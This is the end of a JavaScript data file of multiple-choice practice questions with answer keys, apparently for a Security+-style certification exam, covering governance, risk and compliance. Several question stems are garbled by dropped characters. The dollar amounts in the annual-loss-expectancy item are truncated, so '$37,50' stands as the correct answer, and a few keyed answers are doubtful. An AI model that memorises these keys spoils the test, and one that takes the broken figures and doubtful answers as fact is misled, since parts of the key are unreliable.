        "Only U.S. federal laws",
      ],
      correctAnswer: "State laws in Illinois, Indiana, and Ohio",
    },
    {
      question:
        "You are an IT administrator for a company and you are adding new employees to an organization's identity and access management system. Which of the following best describes the process you are performing?",
      incorrectAnswers: ["Offboarding", "Adverse action", "Job rotation"],
      correctAnswer: "Onboarding",
    },
    {
      question:
        "Mark is an office manager at a local bank branch. He wants to ensure that customer information isn't compromised when the deskside employees are away from their desks for the day. What security concept would Mark use to mitigate this concern?",
      incorrectAnswers: [
        "Background checks",
        "Continuing education",
        "Job rotation",
      ],
      correctAnswer: "Clean desk",
    },
    {
      question:
        "You are a security administrator and advise the web development team to include a CAPTCHA on the web page where users register for an account. Which of the following controls is this referring to?",
      incorrectAnswers: ["Detective", "Compensating", "Degaussing"],
      correctAnswer: "Deterrent",
    },
    {
      question: "Which of the following is not a common security policy type?",
      incorrectAnswers: [
        "Acceptable use policy",
        "Social media policy",
        "Password policy",
      ],
      correctAnswer: "Parking policy",
    },
    {
      question:
        "As the IT security officer for your organization, you are configuring data label options for your company's research and development file server. Regular users can label documents as contractor, public, or internal. Which label should be assigned to company trade secrets?",
      incorrectAnswers: ["High", "Top secret", "Low"],
      correctAnswer: "Proprietary",
    },
    {
      question: "Which of the following is not a physical security control?",
      incorrectAnswers: [
        "Motion detector",
        "Fence",
        "Closed-circuit television (CCTV)",
      ],
      correctAnswer: "Antivirus software",
    },
    {
      question:
        "Your security manager wants to decide which risks to mitigate based on cost. What is this an example of?",
      incorrectAnswers: [
        "Qualitative risk assessment",
        "Business impact analysis",
        "Threat assessment",
      ],
      correctAnswer: "Quantitative risk assessment",
    },
    {
      question:
        "Your company has outsourced its proprietary processes to Acme Corporation. Due to technical issues, Acme wants to include a third-party vendor to help resolve the technical issues. Which of the following must Acme consider before sending data to the third party?",
      incorrectAnswers: [
        "This data should be encrypted before it is sent to the third-party vendor.",
        "This may constitute unauthorized data sharing.",
        "This may violate the privileged user role-based awareness training.",
      ],
      correctAnswer: "This may violate a nondisclosure agreement.",
    },
    {
      question: "Which of the following is considered a detective control?",
      incorrectAnswers: ["An acceptable use policy", "Firewall", "IPS"],
      correctAnswer: "Closed-circuit television (CCTV)",
    },
    {
      question: "Which of the following is typically included in a BPA?",
      incorrectAnswers: [
        "Clear statements detailing the expectation between a customer and a service provider",
        "The agreement that a specific function or service will be delivered at the agreed-on level of performance",
        "Security requirements associated with interconnecting IT systems",
      ],
      correctAnswer:
        "Sharing of profits and losses and the addition or removal of a partner",
    },
    {
      question:
        "You are the network administrator of your company, and the manager of a retail site located across town has complained about the loss of power to their building several times this year. The branch manager is asking for a compensating control to overcome the power outage. What compensating control would you recommend?",
      incorrectAnswers: ["Firewall", "Security guard", "IDS"],
      correctAnswer: "Backup generator",
    },
    {
      question:
        "James is a security administrator and is attempting to block unauthorized access to the desktop computers within the company's network. He has configured the computers' operating systems to lock after 5 minutes of no activity. What type of security control has James implemented?",
      incorrectAnswers: ["Corrective", "Deterrent", "Detective"],
      correctAnswer: "Preventive",
    },
    {
      question:
        "An accounting employee changes roles with another accounting employee every 4 months. What is this an example of?",
      incorrectAnswers: [
        "Separation of duties",
        "Mandatory vacation",
        "Onboarding",
      ],
      correctAnswer: "Job rotation",
    },
    {
      question:
        "Tony's company wants to limit their risk due to customer datWhat practice should they put in place to ensure that they have only the data needed for their business purposes?",
      incorrectAnswers: ["Data masking", "Tokenization", "Anonymization"],
      correctAnswer: "Data minimization",
    },
    {
      question:
        "Your company website is hosted by an Internet service provider. Which of the following risk response techniques is in use?",
      incorrectAnswers: ["Risk register", "Risk acceptance", "Risk mitigation"],
      correctAnswer: "Risk avoidance",
    },
    {
      question:
        "A security administrator is reviewing the company's continuity plan, and it specifies an RTO of four hours and an RPO of one day. Which of the following is the plan describing?",
      incorrectAnswers: [
        "Systems should be restored within one day and should remain operational for at least four hours.",
        "Systems should be restored within four hours and no later than one day after the incident.",
        "Systems should be restored within one day and lose, at most, four hours' worth of data.",
      ],
      correctAnswer:
        "Systems should be restored within four hours with a loss of one day's worth of data at most.",
    },
    {
      question:
        "Which of the following statements is true regarding a data retention policy?",
      incorrectAnswers: [
        "Employees must remove and lock up all sensitive and confidential documents when not in use.",
        "It describes a formal process of managing configuration changes made to a network.",
        "It is a legal document that describes a mutual agreement between parties.",
      ],
      correctAnswer:
        "Regulations require financial transactions to be stored for seven years.",
    },
    {
      question:
        "How do you calculate the annual loss expectancy (ALE) that may occur due to a threat?",
      incorrectAnswers: [
        "Exposure factor (EF) / single loss expectancy (SLE)",
        "Asset value (AV) x exposure factor (EF)",
        "Single loss expectancy (SLE) / exposure factor (EF)",
      ],
      correctAnswer:
        "Single loss expectancy (SLE) x annual rate of occurrence (ARO)",
    },
    {
      question:
        "Michelle has been asked to use the CIS benchmark for Windows 10 as part of her system security process. What information will she be using?",
      incorrectAnswers: [
        "Information on how secure Windows 10 is in its default state",
        "Performance benchmark tools for Windows 10 systems, including network speed and firewall throughput",
        "Vulnerability scan data for Windows 10 systems provided by various manufacturers",
      ],
      correctAnswer:
        "A set of recommended security configurations to secure Windows 10",
    },
    {
      question:
        "Which of the following is the best example of a preventive control?",
      incorrectAnswers: ["Security camera", "Door alarm", "Smoke detectors"],
      correctAnswer: "Data backups",
    },
    {
      question:
        "You are a security administrator for your company and you identify a security risk that you do not have in-house skills to address. You decide to acquire contract resources. The contractor will be responsible for handling and managing this security risk. Which of the following type of risk response techniques are you demonstrating?",
      incorrectAnswers: ["Accept", "Mitigate", "Avoid"],
      correctAnswer: "Transfer",
    },
    {
      question:
        "Each salesperson who travels has a cable lock to lock down their laptop when they step away from the device. To which of the following controls does this apply?",
      incorrectAnswers: ["Administrative", "Compensating", "Deterrent"],
      correctAnswer: "Preventive",
    },
    {
      question:
        "You are a server administrator for your company's private clouTo provide service to employees, you are instructed to use reliable hard disks in the server to host a virtual environment. Which of the following best describes the reliability of hard drives?",
      incorrectAnswers: ["MTTR", "RPO", "ALE"],
      correctAnswer: "MTBF",
    },
    {
      question:
        "All of your organization's traffic flows through a single connection to the Internet. Which of the following terms best describes this scenario?",
      incorrectAnswers: ["Cloud computing", "Load balancing", "Virtualization"],
      correctAnswer: "Single point of failure",
    },
    {
      question:
        "Which of the following best describes the disadvantages of quantitative risk analysis compared to qualitative risk analysis?",
      incorrectAnswers: [
        "Quantitative risk analysis is sometimes subjective.",
        "Quantitative risk analysis requires expertise on systems and infrastructure.",
        "Quantitative risk provides clear answers to risk-based questions.",
      ],
      correctAnswer:
        "Quantitative risk analysis requires detailed financial data.",
    },
    {
      question:
        "Leigh Ann is the new network administrator for a local community bank. She studies the current file server folder structures and permissions. The previous administrator didn't properly secure customer documents in the folders. Leigh Ann assigns appropriate file and folder permissions to be sure that only the authorized employees can access the datWhat security role is Leigh Ann assuming?",
      incorrectAnswers: ["Power user", "Data owner", "User"],
      correctAnswer: "Custodian",
    },
    {
      question:
        "Categorizing residual risk is most important to which of the following risk response techniques?",
      incorrectAnswers: ["Risk mitigation", "Risk avoidance", "Risk transfer"],
      correctAnswer: "Risk acceptance",
    },
    {
      question:
        "You are the IT manager and one of your employees asks who assigns data labels. Which of the following assigns data labels?",
      incorrectAnswers: ["Custodian", "Privacy officer", "System administrator"],
      correctAnswer: "Owner",
    },
    {
      question:
        "Which of the following is the most pressing security concern related to social media networks?",
      incorrectAnswers: [
        "Other users can view your MAC address.",
        "Other users can view your IP address.",
        "Employees can express their opinion about their company.",
      ],
      correctAnswer: "Employees can leak a company's confidential information.",
    },
    {
      question:
        "What concept is being used when user accounts are created by one employee and user permissions are configured by another employee?",
      incorrectAnswers: ["Background checks", "Job rotation", "Collusion"],
      correctAnswer: "Separation of duties",
    },
    {
      question:
        "A security analyst is analyzing the cost the company could incur if the customer database was breacheThe database contains 2,500 records with personally identifiable information (PII). Studies show the cost per record would be $300. The likelihood that the database would be breached in the next year is only 5 percent. Which of the following would be the ALE for a security breach?",
      incorrectAnswers: ["$15,00", "$150,00", "$750,00"],
      correctAnswer: "$37,50",
    },
    {
      question:
        "Which of the following concepts defines a company goal for system restoration and acceptable data loss?",
      incorrectAnswers: ["MTBF", "MTTR", "ARO"],
      correctAnswer: "RPO",
    },
    {
      question:
        "Your company hires a third-party auditor to analyze the company's data backup and long-term archiving policy. Which type of organization document should you provide to the auditor?",
      incorrectAnswers: [
        "Clean desk policy",
        "Acceptable use policy",
        "Security policy",
      ],
      correctAnswer: "Data retention policy",
    },
    {
      question:
        "You are a network administrator and have been given the duty of creating user accounts for new employees the company has hireThese employees are added to the identity and access management system and assigned mobile devices. What process are you performing?",
      incorrectAnswers: ["Offboarding", "System owner", "Executive user"],
      correctAnswer: "Onboarding",
    },
    {
      question: "What type of control is separation of duty?",
      incorrectAnswers: ["Physical", "Technical", "Compensating"],
      correctAnswer: "Operational",
    },
    {
      question: "Which of the following rights is not included in the GDPR?",
      incorrectAnswers: [
        "The right to access",
        "The right to be forgotten",
        "The right to data portability",
      ],
      correctAnswer: "The right to anonymity",
    },
    {
      question:
        "Nick is following the National Institute of Standards and Technology (NIST) Risk Management Framework (RMF) and has completed the prepare and categorize steps. Which step in the risk management framework is next?",
      incorrectAnswers: [
        "Assessing controls",
        "Implementing controls",
        "Monitoring controls",
      ],
      correctAnswer: "Selecting controls",
    },
    {
      question:
        "Why are diversity of training techniques an important concept for security program administrators?",
      incorrectAnswers: [
        "It allows for multiple funding sources.",
        "It avoids a single point of failure in training compliance.",
        "It is required for compliance with PCI-DSS.",
      ],
      correctAnswer: "Each person responds to training differently.",
    },
    {
      question:
        "Alyssa has been asked to categorize the risk of outdated software in her organization. What type of risk categorization should she use?",
      incorrectAnswers: ["Quantitative", "Qualitative", "External"],
      correctAnswer: "Internal",
    },
    {
      question:
        "What term is used to describe a listing of all of an organization's risks, including information about the risk's rating, how it is being remediated, remediation status, and who owns or is assigned responsibility for the risk?",
      incorrectAnswers: ["An SSAE", "A risk table", "A DSS"],
      correctAnswer: "A risk register",
    },
    {
      question:
        "Which of the following terms is used to measure how maintainable a system or device is?",
      incorrectAnswers: ["MTBF", "MTTF", "MITM"],
      correctAnswer: "MTTR",
    },
    {
      question:
        "The company that Olivia works for has recently experienced a data breach that exposed customer data, including their home addresses, shopping habits, email addresses, and contact information. Olivia's company is an industry leader in their space but has strong competitors as well. Which of the following impacts is not likely to occur now that the organization has completed their incident response process?",
      incorrectAnswers: ["Identity theft", "Financial loss", "Reputation loss"],
      correctAnswer: "Availability loss",
    },
    {
      question:
        "Eric works for the U.S. government and needs to classify datWhich of the following is not a common classification type for U.S. government data?",
      incorrectAnswers: ["Top Secret", "Secret", "Confidential"],
      correctAnswer: "Civilian",
    },
    {
      question:
        "Which of the following is not a common location for privacy practices to be recorded or codified?",
      incorrectAnswers: [
        "A formal privacy notice",
        "The terms of the organization's agreement with customers",
        "None of the above",
      ],
      correctAnswer: "The source code for a product",
    },
    {
      question:
        "What key difference separates pseudonymization and anonymization?",
      incorrectAnswers: [
        "Anonymization uses encryption.",
        "Anonymization can be reversed using a hash.",
        "Pseudonymization uses randomized tokens.",
      ],
      correctAnswer:
        "Pseudonymization requires additional data to reidentify the data subject.",
    },
    {
      question:
        "What policy clearly states the ownership of information created or used by an organization?",
      incorrectAnswers: [
        "An information security policy",
        "An acceptable use policy",
        "A data retention policy",
      ],
      correctAnswer: "A data governance policy",
    },
    {
      question:
        "Helen's organization provides telephone support for their entire customer base as a critical business function. She has created a plan that will ensure that her organization's Voice over IP (VoIP) phones will be restored in the event of a disaster. What type of plan has she created?",
      incorrectAnswers: [
        "A disaster recovery plan",
        "An RPO plan",
        "An MTBF plan",
      ],
      correctAnswer: "A functional recovery plan",
    },
    {
      question:
        "Greg has data that is classified as health information that his organization uses as part of their company's HR datWhich of the following statements is true for his company's security policy?",
      incorrectAnswers: [
        "The health information must be encrypted.",
        "Companies are prohibited from storing health information and must outsource to third parties.",
        "All of the above",
      ],
      correctAnswer:
        "Greg should review relevant law to ensure the health information is handled properly.",
    },
    {
      question: "What type of information does a control risk apply to?",
      incorrectAnswers: [
        "Health information",
        "Personally identifiable information (PII)",
        "Intellectual property",
      ],
      correctAnswer: "Financial information",
    },
    {
      question:
        "What type of impact is an individual most likely to experience if a data breach that includes PII occurs?",
      incorrectAnswers: ["IP theft", "Reputation damage", "Fines"],
      correctAnswer: "Identity theft",
    },
    {
      question:
        "Isaac has been asked to write his organization's security policies. What policy is commonly put in place for service accounts?",
      incorrectAnswers: [
        "They must be issued only to system administrators.",
        "They must use multifactor authentication.",
        "All of the above",
      ],
      correctAnswer: "They cannot use interactive logins.",
    },
    {
      question:
        "Nina is tasked with putting radio frequency identification (RFID) tags on every new piece of equipment that enters her datacenter that costs more than $500. What type of organizational policy is most likely to include this type of requirement?",
      incorrectAnswers: [
        "A change management policy",
        "An incident response policy",
        "An acceptable use policy",
      ],
      correctAnswer: "An asset management policy",
    },
    {
      question:
        "Emma is reviewing third-party risks to her organization, and Nate, her organization's procurement officer, notes that purchases of some laptops from the company's hardware vendor have been delayed due to lack of availability of SSDs (solid state drives) and specific CPUs for specific configurations. What type of risk should Emma describe this as?",
      incorrectAnswers: [
        "Financial risk",
        "A lack of vendor support",
        "System integration",
      ],
      correctAnswer: "Supply chain",
    },
    {
      question:
        "Henry has implemented an intrusion detection system. What category and control type could he list for an IDS?",
      incorrectAnswers: [
        "Administrative, Preventative",
        "Technical, Corrective",
        "Administrative, Detective",
      ],
      correctAnswer: "Technical, Detective",
    },
    {
      question:
        "Amanda administers Windows 10 workstations for her company and wants to use a secure configuration guide from a trusted source. Which of the following is not a common source for Windows 10 security benchmarks?",
      incorrectAnswers: ["CIS", "Microsoft", "The NSA"],
      correctAnswer: "The FTC",
    },
    {
      question:
        "Katie has discovered a Windows 2008 web server running in her environment. What security concern should she list for this system?",
      incorrectAnswers: [
        "Windows 2008 only runs on 32-bit platforms.",
        "Windows 2008 cannot run modern web server software.",
        "All of the above",
      ],
      correctAnswer:
        "Windows 2008 has reached its end of life and cannot be patched.",
    },
    {
      question:
        "Patching systems immediately after patches are released is an example of what risk management strategy?",
      incorrectAnswers: ["Acceptance", "Mitigation", "Transference"],
      correctAnswer: "Avoidance",
    },
    {
      question:
        "Charles wants to display information from his organization's risk register in an easy-tounderstand and -rank format. What common tool is used to help management quickly understand relative rankings of risk?",
      incorrectAnswers: [
        "Risk plots",
        "A qualitative risk assessment",
        "A quantitative risk assessment",
      ],
      correctAnswer: "A heat map",
    },
    {
      question:
        "What key element of regulations, like the European Union's (EU's) GDPR, drive organizations to include them in their overall assessment of risk posture?",
      incorrectAnswers: [
        "Their annual loss expectancy (ALE)",
        "Their recovery time objective (RTO)",
        "The likelihood of occurrence",
      ],
      correctAnswer: "Potential fines",
    },
    {
      question:
        "What phases of handling a disaster are covered by a disaster recovery plan?",
      incorrectAnswers: [
        "What to do before the disaster",
        "What to do during the disaster",
        "What to do after the disaster",
      ],
      correctAnswer: "All of the above",
    },
    {
      question:
        "Naomi's organization has recently experienced a breach of credit card information. After investigation, it is discovered that her organization was inadvertently not fully compliant with PCI-DSS and is not currently fully compliant. Which of the following penalties is her organization most likely to incur?",
      incorrectAnswers: [
        "Criminal charges",
        "Termination of the credit card processing agreement",
        "All of the above",
      ],
      correctAnswer: "Fines",
    },
    {
      question:
        "Alaina wants to map a common set of controls for cloud services between standards like COBIT (Control Objectives for Information and Related Technology), FedRAMP (Federal Risk and Authorization Management Program), HIPAA (the Health Insurance Portability and Accountability Act of 1996), and others. What can she use to speed up that process?",
      incorrectAnswers: [
        "The CSA's reference architecture",
        "ISO 27001",
        "ISO 27002",
      ],
      correctAnswer: "The CSA's cloud control matrix",
    },
    {
      question:
        "Gary has created an application that new staff in his organization are asked to use as part of their training. The application shows them examples of phishing emails and asks the staff members to identify the emails that are suspicious and why. Correct answers receive points, and incorrect answers subtract points. What type of user training technique is this?",
      incorrectAnswers: [
        "Capture the flag",
        "Phishing campaigns",
        "Role-based training",
      ],
      correctAnswer: "Gamification",
    },
    {
      question: "What law or regulation requires a DPO in organizations?",
      incorrectAnswers: ["FISMA", "COPPA", "PCI-DSS"],
      correctAnswer: "GDPR",
    },
    {
      question:
        "The university that Susan works for conducts top secret research for the U.S. Department of Defense as part of a partnership with its engineering school. A recently discovered breach points to the school being compromised for over a year by an advanced persistent threat actor. What consequence of the breach should Susan be most concerned about?",
      incorrectAnswers: ["Cost to restore operations", "Fines", "Identity theft"],
      correctAnswer: "IP theft",
    },
    {
      question:
        "What term is used to describe the functions that need to be continued throughout or resumed as quickly as possible after a disaster?",
      incorrectAnswers: [
        "Single points of failure",
        "Recovery time objectives",
        "Core recovery functions",
      ],
      correctAnswer: "Mission-essential functions",
    },
    {
      question:
        "Your company is considering moving its mail server to a hosting company. This will help reduce hardware and server administrator costs at the local site. Which of the following documents would formally state the reliability and recourse if the reliability is not met?",
      incorrectAnswers: ["MOU", "ISA", "BPA"],
      correctAnswer: "SLA",
    },
    {
      question:
        "Rick's organization provides a website that allows users to create an account and then upload their art to share with other users. He is concerned about a breach and wants to properly classify the data for their handling process. What data type is most appropriate for Rick to label the data his organization collects and stores?",
      incorrectAnswers: ["PII", "Financial information", "Health information"],
      correctAnswer: "Customer data",
    },
    {
      question:
        "Jack is conducting a risk assessment, and a staff member notes that the company has specialized, internal AI algorithms that are part of the company's main product. What risk should Jack identify as most likely to impact those algorithms?",
      incorrectAnswers: ["External", "Internal", "Licensing"],
      correctAnswer: "IP theft",
    },
    {
      question:
        "Dan has written a policy that prohibits employees from sharing their passwords with their coworkers, family members, or others. What type of credential policy has he created?",
      incorrectAnswers: [
        "Device credential policy",
        "A service account policy",
        "An administrative account policy",
      ],
      correctAnswer: "Personnel credential policy",
    },
    {
      question:
        "Risk severity is calculated using the equation shown here. What information should be substituted for X? Risk severity = X * Impact",
      incorrectAnswers: [
        "Inherent risk",
        "MTTR (mean time to repair)",
        "RTO (recovery time objective)",
      ],
      correctAnswer: "Likelihood of occurrence",
    },
    {
      question: "How is asset value determined?",
      incorrectAnswers: [
        "The original cost of the item",
        "The depreciated cost of the item",
        "The cost to replace the item",
      ],
      correctAnswer: "Any of the above based on organizational preference",
    },
    {
      question: "What process is used to help identify critical systems?",
      incorrectAnswers: ["An MTBF", "An RTO", "An ICD"],
      correctAnswer: "A BIA",
    },
    {
      question:
        "Zarmeena wants to transfer the risk for breaches to another organization. Which of the following options should she use to transfer the risk?",
      incorrectAnswers: [
        "Explain to her management that breaches will occur.",
        "Blame future breaches on competitors.",
        "Sell her organization's data to another organization.",
      ],
      correctAnswer: "Purchase cybersecurity insurance.",
    },
    {
      question:
        "Which of the following is a common security policy for service accounts?",
      incorrectAnswers: [
        "Limiting login hours",
        "Limiting login locations",
        "Implementing frequent password expiration",
      ],
      correctAnswer: "Prohibiting interactive logins",
    },
    {
      question:
        "The financial cost of a breach is an example of what component of risk calculations?",
      incorrectAnswers: ["Probability", "Risk severity", "All of the above"],
      correctAnswer: "Impact",
    },
    {
      question:
        "As part of his organization's effort to identify a new headquarters location, Sean reviews the Federal Emergency Management Agency (FEMA) flood maps for the potential location he is reviewing. What process related to disaster recovery planning includes actions like this?",
      incorrectAnswers: [
        "Business impact analysis (BIA)",
        "Crime prevention through environmental design",
        "Business continuity planning",
      ],
      correctAnswer: "Site risk assessment",
    },
    {
      question:
        "Joanna wants to request an audit report from a vendor she is considering and plans to review the auditor's opinions on the effectiveness of the security and privacy controls the vendor has in place. What type of Standard for Attestation Engagements (SSAE) should she request?",
      incorrectAnswers: [
        "SSAE-18 SOC 1, Type 2",
        "SSAE-18 SOC 2, Type 1",
        "SSAE-18 SOC 1, Type 1",
      ],
      correctAnswer: "SSAE-18 SOC 2, Type 2",
    },
    {
      question:
        "Jason has created a risk register for his organization and regularly updates it with input from managers and senior leadership throughout the organization. What purpose does this serve?",
      incorrectAnswers: [
        "It decreases inherent risk.",
        "It decreases residual risk.",
        "It increases risk appetite.",
      ],
      correctAnswer: "It increases risk awareness.",
    },
    {
      question:
        "Laura is aware that her state has laws that guide her organization in the event of a breach of personally identifiable information, including Social Security numbers (SSNs). If she has a breach that involves SSNs, what action is she likely to have to take based on state law?",
      incorrectAnswers: [
        "Destroy all Social Security numbers.",
        "Reclassify all impacted data.",
        "Provide a data minimization plan.",
      ],
      correctAnswer: "Provide public notification of the breach.",
    },
    {
      question:
        "Which of the following does not minimize security breaches committed by internal employees?",
      incorrectAnswers: [
        "Job rotation",
        "Separation of duties",
        "Mandatory vacations",
      ],
      correctAnswer: "Nondisclosure agreements signed by employees",
    },
    {
      question:
        "Olivia's cloud service provider claims to provide \"five nines of uptime\" and Olivia's company wants to take advantage of that service because their website loses thousands of dollars every hour that it is down. What business agreement can Oliva put in place to help ensure that the reliability that the vendor advertises is maintained?",
      incorrectAnswers: ["An MOU", "An MSA", "A BPA"],
      correctAnswer: "An SLA",
    },
    {
      question:
        "After reviewing systems on his network, Brian has discovered that dozens of them are running copies of a CAD software package that the company has not paid for. What risk type should he identify this as?",
      incorrectAnswers: ["Internal", "Legacy systems", "IP theft"],
      correctAnswer: "Software compliance",
    },
    {
      question:
        "Gary is beginning his risk assessment for the organization and has not yet begun to implement controls. What risk does his organization face?",
      incorrectAnswers: ["Residual risk", "IP theft risk", "Multiparty risk"],
      correctAnswer: "Inherent risk",
    },
    {
      question: "How is SLE calculated?",
      incorrectAnswers: ["RTO * AV", "MTTR * EF", "AV * ARO"],
      correctAnswer: "AV * EF",
    },
    {
      question:
        "What type of credential policy is typically created to handle contractors and consultants?",
      incorrectAnswers: [
        "A personnel policy",
        "A service account policy",
        "A root account policy",
      ],
      correctAnswer: "A third-party policy",
    },
    {
      question:
        "Wayne has estimated the ARO for a risk in his organization to be 3. How often does Wayne think the event will happen?",
      incorrectAnswers: [
        "Once every 3 months",
        "Once every three yearss",
        "Once a year for three years",
      ],
      correctAnswer: "Three times a year",
    },
    {
      question:
        "Gurvinder is assessing risks from disasters to his company's facility and wants to properly categorize them in his planning. Which of the following is not a type of natural disaster?",
      incorrectAnswers: ["Fire", "Flood", "Tornado"],
      correctAnswer: "Industrial accidents",
    },
    {
      question:
        "Madhuri is classifying all of her organization's data and wants to properly classify the information on the main organizational website that is available to anyone who visits the site. What data classification should she use from the following list?",
      incorrectAnswers: ["Sensitive", "Confidential", "Critical"],
      correctAnswer: "Public",
    },
    {
      question:
        "Elle works for a credit card company that handles credit card transactions for businesses around the worlWhat data privacy role does her company play?",
      incorrectAnswers: [
        "A data controller",
        "A data steward",
        "A data custodian",
      ],
      correctAnswer: "A data processor",
    },
    {
      question:
        "The website that Brian is using shows part of his Social Security number, not all of it, and replacing the rest of the digits with asterisks, allowing him to verify the last four digits. What technique is in use on the website?",
      incorrectAnswers: ["Tokenization", "Hashing", "Encryption"],
      correctAnswer: "Data masking",
    },
    {
      question:
        "Mike wants to look for a common set of tools for security and risk management for his infrastructure as a service (IaaS) environment. Which of the following organizations provides a vendor-neutral reference architecture that he can use to validate his design?",
      incorrectAnswers: ["The Center for Internet Security (CIS)", "ISO", "NIST"],
      correctAnswer: "The Cloud Security Alliance",
    },
    {
      question: "What type of control is a lock?",
      incorrectAnswers: ["Managerial", "Technical", "Corrective"],
      correctAnswer: "Physical",
    },
    {
      question:
        "Isaac has discovered that his organization's financial accounting software is misconfigured, causing incorrect data to be reported on an ongoing basis. What type of risk is this?",
      incorrectAnswers: ["Inherent risk", "Residual risk", "Transparent risk"],
      correctAnswer: "Control risk",
    },
    {
      question:
        "Which of the following is not a potential type of person-made disaster?",
      incorrectAnswers: ["Fires", "Oil spills", "War"],
      correctAnswer: "Hurricanes",
    },
    {
      question:
        "Susan works for the U.S. government and has identified information in her organization that requires some protection. If the information were disclosed without authorization, it would cause identifiable harm to national security. How should she classify the data?",
      incorrectAnswers: ["Top Secret", "Secret", "Business Sensitive"],
      correctAnswer: "Confidential",
    },
    {
      question:
        "Ed serves as his organization's data steward and wants to classify each data element that is used in their business. How should he classify cell phone numbers?",
      incorrectAnswers: [
        "As PHI",
        "As financial information",
        "As government information",
      ],
      correctAnswer: "As PII",
    },
    {
      question:
        "Marcus wants to ensure that attackers can't identify his customers if they were to gain a copy of his organization's web application database. He wants to protect their Social Security numbers (SSNs) with an alternate value that he can reference elsewhere when he needs to look up a customer by their SSN. What technique should he use to accomplish this?",
      incorrectAnswers: ["Encryption", "Data masking", "Data washing"],
      correctAnswer: "Tokenization",
    },
    {
      question:
        "Which of the following is the most common reason to include a privacy notice on a website?",
      incorrectAnswers: [
        "To warn attackers about security measures",
        "To avoid lawsuits",
        "None of the above",
      ],
      correctAnswer: "Due to regulations or laws",
    },
    {
      question:
        "Nicole determines how her organization processes data that it collects about its customers and also decides how and why personal information should be processeWhat role does Nicole play in her organization?",
      incorrectAnswers: ["Data steward", "Data custodian", "Data consumer"],
      correctAnswer: "Data controller",
    },
    {
      question:
        "The virtual machine cluster that Pat is in charge of has suffered a major failure in its primary controller. The entire organization is offline, and customers cannot get to the organization's website which is its primary business. What type of disaster has Pat's organization experienced?",
      incorrectAnswers: [
        "An MRO disaster",
        "An RTO disaster",
        "An external disaster",
      ],
      correctAnswer: "An internal disaster",
    },
    {
      question:
        "What important step should be taken early in the information life cycle to ensure that organizations can handle the data they collect?",
      incorrectAnswers: [
        "Data retention",
        "Data classification",
        "Data exfiltration",
      ],
      correctAnswer: "Data minimization",
    },
    {
      question:
        "Kirk's organization has been experiencing large-scale denial-of-service (DoS) attacks against their primary website. Kirk contracts with his Internet service provider to increase the organization's bandwidth and expands the server pool for the website to handle significantly more traffic than any of the previous DoS attacks. What type of risk management strategy has he employed?",
      incorrectAnswers: ["Acceptance", "Avoidance", "Transfer"],
      correctAnswer: "Mitigation",
    },
    {
      question:
        "The co-location facility that Joanna contracts to host her organization's servers is in a flood plain in a hurricane zone. What type of risk best describes the risk that Joanna and other customers face?",
      incorrectAnswers: ["An internal risk", "A legacy risk", "An IP theft risk"],
      correctAnswer: "A multiparty risk",
    },
    {
      question:
        "The cloud service that Natasha's organization has used for the past five years will no longer be available. What phase of the vendor relationship should Natasha plan for with this service?",
      incorrectAnswers: [
        "Preparing a service MOU",
        "Creating an NDA",
        "A last will and testament",
      ],
      correctAnswer: "An EOL transition process",
    },
    {
      question:
        "Gary wants to use a secure configuration benchmark for his organization for Linux. Which of the following organizations would provide a useful, commonly adopted benchmark that he could use?",
      incorrectAnswers: ["Microsoft", "NIST", "All of the above"],
      correctAnswer: "CIS",
    },
    {
      question:
        "After Angela left her last organization, she discovered that she still had access to her shared drives and could log in to her email account. What critical process was likely forgotten when she left?",
      incorrectAnswers: ["An exit interview", "Job rotation", "Governance"],
      correctAnswer: "Offboarding",
    },
    {
      question:
        "Frank knows that businesses can use any classification labels they want, but he also knows that there are a number of common labels in use. Which of the following is not a common data classification label for businesses?",
      incorrectAnswers: ["Public", "Sensitive", "Private"],
      correctAnswer: "Secret",
    },
    {
      question: "Where are privacy notices frequently found?",
      incorrectAnswers: [
        "The terms of an agreement for customers",
        "A click-through license agreement",
        "A website usage agreement",
      ],
      correctAnswer: "All of the above",
    },
  ];
  
  const questionDatabase = [
    {
      id: 1,
      sectionTitle: "Threats, Attacks, and Vulnerabilities",
      sectionContent: sectionOne,
    },
    {
      id: 2,
      sectionTitle: "Architecture and Design",
      sectionContent: sectionTwo,
    },
    {
      id: 3,
      sectionTitle: "Implementation",
      sectionContent: sectionThree,
    },
    {
      id: 4,
      sectionTitle: "Operations and Incident Response",
      sectionContent: sectionFour,
    },
    {
      id: 5,
      sectionTitle: "Governance, Risk, and Compliance",
      sectionContent: sectionFive,
    },
  ];
  
  //export {sectionOne, sectionTwo, sectionThree, sectionFour, sectionFive}
  export default questionDatabase;
  